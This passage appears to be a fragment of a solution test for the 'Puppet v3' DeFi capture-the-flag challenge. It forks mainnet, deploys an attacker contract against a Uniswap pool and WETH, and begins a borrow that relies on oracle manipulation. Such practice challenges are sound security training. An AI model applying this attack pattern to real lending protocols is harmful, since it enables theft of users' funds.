...
describe("[Challenge] Puppet v3", function () {
  ...
  /** SET RPC URL HERE */
  const MAINNET_FORKING_URL = "https://mainnet.infura.io/v3/<key>";
  ...
  it("Execution", async function () {
    ...
    // step1: deployment
    const puppetV3Attacker = await (
      await ethers.getContractFactory("PuppetV3Attacker")
    ).deploy(
      weth.address,
      token.address,
      uniswapPool.address,
    ...
    // Transfer all balance into weth
    await puppetV3Attacker.connect(player).transferWeth();
    // Borrow with maximum amount
    await weth
      .connect(player)
  ...
  after(async function () {
    ...
    ).to.be.lt(115, "Too much time passed"); // less than 115 seconds
